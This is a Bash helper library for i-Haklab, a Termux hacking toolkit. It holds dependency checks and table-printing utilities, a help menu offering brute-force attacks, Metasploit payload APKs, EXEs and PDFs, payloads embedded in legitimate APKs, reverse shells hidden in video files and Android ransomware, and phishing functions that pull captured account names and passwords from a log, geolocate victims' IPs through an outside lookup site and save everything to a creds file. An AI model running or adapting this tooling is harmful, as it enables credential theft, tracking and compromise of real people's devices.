#!/bin/bash
# This file contain all i-Haklab functions

iHAKLAB=/data/data/com.termux/files/home/.local/share/i-Haklab

banner() {
	if [[ ! -e $iHAKLAB/.set/libexec/banner/i-Haklab ]]
	then
		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/i-Haklab -O $iHAKLAB/.set/libexec/banner/i-Haklab > /dev/null 2>&1
	fi
	bash $iHAKLAB/.set/libexec/banner/i-Haklab
  sleep 0.5
}
export -f banner

k-boom() {
	if [ ! -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/k-boom -O $iHAKLAB/.set/libexec/banner/k-boom > /dev/null 2>&1
	fi
	bash $iHAKLAB/.set/libexec/banner/k-boom
}
export -f k-boom

running(){
	sleep $1 &
	pid=$!
  spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
  while [ "$(ps a|awk '{print $1}'|grep $pid)" ]; do
		for i in "${spinner[@]}";do
			tput civis
			printf  "$green\r(_➤) Searching\t$i\b\b\b\b\b\b\b\b";
    done
  done
  tput cnorm
  printf "\t$W[$G¡RUN!$W]\n";
}
export -f running

STDERROOT(){ printf "$R\n(_➤)$W Rooted device required";exit;}
export -f STDERROOT

STDERR(){ printf "$R(_➤)$W missing argument, type i-Haklab -h for help";exit;}
export -f STDERR

APTupdate(){
	for count in {1..4};do
		if [[ $(apt update|grep "All packages are up to date.") ]] &>/dev/null 2>>$LOGFILE
		then
			echo "All packages are up to date."
			break
		elif [[ $count -eq 3 ]]; then
			printf "$R\n(_➤) APT ERROR$W |$Y try using IbyC-fixer$W\n"
			break
    else
			yes|apt upgrade &>/dev/null 2>>$LOGFILE
		fi
	done
}
export -f APTupdate

chk-iHaklab() {
	until [ -d $iHAKLAB ]; do
		printf "$R\n(_➤) i-Haklab needed$W |$Y Do you wanna install it?$W\n"
        	while read -p "(yes/no)─➤ " yesorno && [ -z $yesorno ]; do
                	continue
        	done
        	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
                	git clone --quiet https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
                	cd ~/i-Haklab;bash setup
        	else
                	printf "$Goke\n(_➤) Have a nice hacking day!!\n$W"
                	exit
        	fi
	done
}
export -f chk-iHaklab

chk-Cuser() {
	while [ ! $(id -u) -ne 0 ]; do
        	printf "$R\n(_➤)$W You need to be a common user\n"
        	exit
	done
}
export -f chk-Cuser

chk-Ruser() {
	while [ ! $(id -u) -eq 0 ]; do
		printf "$R\n(_➤) You need to be a root user$W\n"
		exit
	done
}
export -f chk-Ruser

chk-api() {
        command -v termux-open > /dev/null || { printf "$R(_➤)$W termux-tools needed$R |$W run i-Haklab install termux-tools"; exit; }
}
export -f chk-api

chk-sudo() {
        command -v sudo > /dev/null || { printf "$R(_➤)$W sudo command needed$R |$W please install it"; exit; }
}
export -f chk-sudo

chk-root(){
        if [[ -x /system/xbin/su ]] || [[ -x /su/bin/su ]] || [[ -x /sbin/su ]];then
		chk-sudo
                return 0
	else
                return 1
	fi
        }
export -f chk-root

chk-network(){
        until ping -q -c1 -W 1 8.8.8.8 >/dev/null 2>/dev/null;do
		printf "$R(_➤) Please connect to internet$W\n"
		exit
	done
}
export -f chk-network

chk-msf() {
        command -v msfconsole > /dev/null || { printf "$R\n(_➤)$W Metasploit needed$R |$W run i-Haklab install metasploit";exit; }
}
export -f chk-msf

chk-java() {
         command -v java >/dev/null || { printf "$R\n(_>)$W java needed$R |$W run i-Haklab install java";exit; }
}
export -f chk-java

chk-php() {
        command -v php > /dev/null || { printf "$R\n(_➤)$W php not found$R |$W run i-Haklab install php"; exit; }
}
export -f chk-php

chk-ssh() {
        command -v ssh > /dev/null || { printf "$R\n(_➤)$W ssh not found$R |$W run i-Haklab install openssh"; exit; }
}
export -f chk-ssh

chk-mega() {
        command -v megadl > /dev/null || { printf "$R\n(_➤)$W megatools not found$R |$W run i-Haklab install megatools"; exit; }
}
export -f chk-mega

chk-hydra() {
        command -v hydra > /dev/null || { printf "$R\n(_➤)$W hydra not found$R |$W run i-Haklab install hydra"; exit; }
}
export -f chk-hydra

chk-ffsend() {
        command -v ffsend > /dev/null || apt install ffsend -y >/dev/null 2>&1
}
export -f chk-ffsend

chk-tunnel() {
	if ping -q -c 1 -W 1 localtunnel.me >/dev/null 2>&1;then
		TUNNEL="localtunnel.me"
	elif ping -q -c 1 -W 1 serverless.social >/dev/null 2>&1;then
		TUNNEL="serverless.social"
	else
		printf "$R\n(_➤)$W Server not available$R |$W try it later\n"
		exit
	fi
}
export -f chk-tunnel

chk-snow() {
        command -v snow >/dev/null || bash $iHAKLAB/.set/to-install/stegsnow >/dev/null 2>&1
}
export -f chk-snow

Menu() {
	printf "$Y\n(_➤)$W i-Haklab $version (c) 2021 by @Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
$Y OPTIONS$W|$Y   Arguments$W   |$Y    Description$W
╰─about─────+──<name─of─tool>───➤ Show informations about tool/framework
|   ╰───example─────────────────{─i-Haklab about crunch─}
╰─help/-h───➤───────────────────➤ Show this help menu
╰─install───+──<name─of─tool>───➤ Install an specifics tools/frameworks
|   ╰───────+─────alltools──────➤ Install all tools/frameworks available on i-Haklab
╰reinstall──➤───────────────────➤ Re-configure i-Haklab at default settings
╰─remove────+──<name─of─tool>───➤ Remove an specifics installed tools/frameworks
|   ╰───────+─────alltools──────➤ Remove all installed tools/frameworks
╰─restore───➤───────────────────➤ Restore the main directory to fix some bugs
╰─root──────➤───────────────────➤ Simulates a super user environment with proot
╰─show──────+─────alltools──────➤ List all tools/frameworks available on i-Haklab
|   ╰───────+────instatools─────➤ Show all installed tools/framewotks
|   ╰───────+──────games────────➤ Show all games available to play on Termux
|   ╰───────+──────books────────➤ Show all books available to download
|   ╰───────+─────tutorials─────➤ Show tutorials available
|   ╰───────+───────QG──────────➤ Show quick guides available
╰speedtest──➤───────────────────➤ Run a speed test of your network
╰─update────➤───────────────────➤ Update i-Haklab
╰─version───➤───────────────────➤ Show i-Haklab version installed
╰─weechat───➤───────────────────➤ Connect with irc Ivam3byCinderella chat
|           |                   |
|           |                   |
  $Y [--] Automatitation Arguments [--]$W
  OPTIONS  |     ARGUMENTS      |    DESCRIPTIONS
╰───bf─────+─ftp|mail|ssh|telnet➤ Brute force attack at several servers.
|    ╰──example─for─ftp─────────{─i-Haklab bf ftp
|    ╰──example─for─mail────────{─i-Haklab bf mail ivam3@live.com, gmail or live.com
|
╰──esmsg───+──encode/decode─────➤ Encode|decode secret message into a ASCII file.
|                   ╰──example──{─i-Haklab esmsg <encode/decode-}
|
╰forwarding+─<port─+─subdomain>─➤ Start a SSH client to request TCP port forwarding
|    ╰──example─────────────{─i-Haklab forwarding 4444 my-subdomain-}
|
╰─handler──+─<name─of─file.rc>──➤ Start handler on msfconsole with previous setting
|
╰───msf────+─dirscan─+─IPtarget─➤ Enumerate directories/subdirecotires from a server.
|    |         ╰──example───────{─i-Haklab msf dirscan 10.10.10.242-}
|    ╰─────+─embed──────────────➤ Embed a metasploit payload into legitim apk file.
|              ╰─ex─for─outlan──{─i-Haklab msf embed 6.tcp.ngrok.io 4546 /path/to/file.apk
|    ╰─────+─payapk─+─tun0:port─➤ Create a coded payload .apk
|    |         ╰─ex─for─outlan──{─i-Haklab msf payapk 6.tcp.ngrok.io 23453─}
|    ╰─────+─payexe─+─tun0:port─➤ Create a coded payload .exe
|    |         ╰─ex─for─inlan───{─i-Haklab msf payexe 192.168.0.1 8080─}
|    ╰─────+─paypdf─+─tun0:port─➤ Create a coded payload .pdf
|    |         ╰─ex─default─set─{─i-Haklab msf paypdf─}
|    ╰─────+──────shodan────────➤ Search vulnerable webcam servers using metasploit
|
╰─payvid───➤────────────────────➤ Hide a Reverse Shell with a Video File by Exploiting Linux OS.
|
╰─phonescan+─<phonenumber>──────➤ A phone number information scaner
|              ╰──example───────{─i-Haklab phonescan 525584923476─}
|
╰─ransomux─➤────────────────────➤ Create a ransomware to be exploitable on android.
╰─share────+─<upload/download>──➤ Share files and directories remotely and securely
|               ╰───────|───────{─i-Haklab share upload file.txt password(optional)─}
|                       ╰───────{i-Haklab share download https://send.vis.ee/download/..─}
╰─────────────────────────────────────────────────────────────────────────────────────────|\n\n"
}
export -f Menu

printTable(){
    local -r delimiter="${1}"
    local -r data="$(removeEmptyLines "${2}")"

    if [[ "${delimiter}" != '' && "$(isEmptyString "${data}")" = 'false' ]]
    then
        local -r numberOfLines="$(wc -l <<< "${data}")"

        if [[ "${numberOfLines}" -gt '0' ]]
        then
            local table=''
            local i=1

            for ((i = 1; i <= "${numberOfLines}"; i = i + 1))
            do
                local line=''
                line="$(sed "${i}q;d" <<< "${data}")"

                local numberOfColumns='0'
                numberOfColumns="$(awk -F "${delimiter}" '{print NF}' <<< "${line}")"

                if [[ "${i}" -eq '1' ]]
                then
                    table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
                fi

                table="${table}\n"

                local j=1

                for ((j = 1; j <= "${numberOfColumns}"; j = j + 1))
                do
                    table="${table}$(printf '#| %s' "$(cut -d "${delimiter}" -f "${j}" <<< "${line}")")"
                done

                table="${table}#|\n"

                if [[ "${i}" -eq '1' ]] || [[ "${numberOfLines}" -gt '1' && "${i}" -eq "${numberOfLines}" ]]
                then
                    table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
                fi
            done

            if [[ "$(isEmptyString "${table}")" = 'false' ]]
            then
                echo -e "${table}" | column -s '#' -t | awk '/^\+/{gsub(" ", "-", $0)}1'
            fi
        fi
    fi
}
export -f printTable

removeEmptyLines(){
    local -r content="${1}"
    echo -e "${content}" | sed '/^\s*$/d'
}
export -f removeEmptyLines

repeatString(){
    local -r string="${1}"
    local -r numberToRepeat="${2}"
    if [[ "${string}" != '' && "${numberToRepeat}" =~ ^[1-9][0-9]*$ ]]
    then
        local -r result="$(printf "%${numberToRepeat}s")"
        echo -e "${result// /${string}}"
    fi
}
export -f repeatString

isEmptyString(){
    local -r string="${1}"
    if [[ "$(trimString "${string}")" = '' ]]
    then
        echo 'true' && return 0
    fi
    echo 'false' && return 1
}
export -f isEmptyString

trimString(){
    local -r string="${1}"
    sed 's,^[[:blank:]]*,,' <<< "${string}" | sed 's,[[:blank:]]*$,,'
}
export -f trimString

phishing-CredsResults() {
	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
	if [ ! -z $ACCOUNT ]; then
		printf "$G\n(_➤) ACCOUNT:$W$ACCOUNT"
		echo $ACCOUNT >> $TMP_PATH/creds.txt
		sleep 0.5
	fi
	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
	if [ ! -z $PASSWD ]; then
		printf "$G\n(_➤) PASSWORD:$W$PASSWD"
		echo $PASSWD >> $TMP_PATH/creds.txt
		sleep 0.5
	fi
}
export -f phishing-CredsResults

phishing-IPresults() {
IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)

if [ ! -z $IP ]; then 
	printf "$G\n(_➤) IP:$W$IP"
	echo $IP >> $TMP_PATH/creds.txt
	sleep 0.5
fi

UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
if [ ! -z $UA ]; then
	printf "$G\n(_➤) User Agent$W$UA"
	echo $UA >> $TMP_PATH/creds.txt
	sleep 0.5
fi
IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$IP_SPEED' ]; then
	printf "$G\n(_➤) IP Address speed:$W$IP_SPEED"
	echo $IP_SPEED >> $TMP_PATH/creds.txt
	sleep 0.5
fi
IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$IP_CURRENCY' ]; then
	printf "$G\n(_➤) IP Currency:$W$IP_CURRENCY"
	echo $IP_CURRENCY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
if [ ! -z '$CONTINENT' ]; then
	printf "$G\n(_➤) Continent:$W$CONTINENT"
	echo $CONTINENT >> $TMP_PATH/creds.txt
	sleep 0.5
fi
COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [ ! -z $COUNTRY ]; then
	printf "$G\n(_➤) Country:$W$COUNTRY"
	echo $COUNTRY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [ ! -z '$STATE' ]; then
	printf "$G\n(_➤) State:$W$STATE"
	echo $STATE >> $TMP_PATH/creds.txt
	sleep 0.5
fi
CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z $CITY ]; then
	printf "$G\n(_➤) City:$W$CITY"
	echo $CITY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z $ISP ]; then
	printf "$G\n(_➤) ISP:$W$IPS"
	echo $ISP >> $TMP_PATH/creds.txt
	sleep 0.5
fi
AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$AS_NUM' ]; then
	printf  "$G\n(_➤) AS Number:$W$AS_NUM"
	echo $AS_NUM >> $TMP_PATH/creds.txt
	sleep 0.5 
fi
}
export -f phishing-IPresults

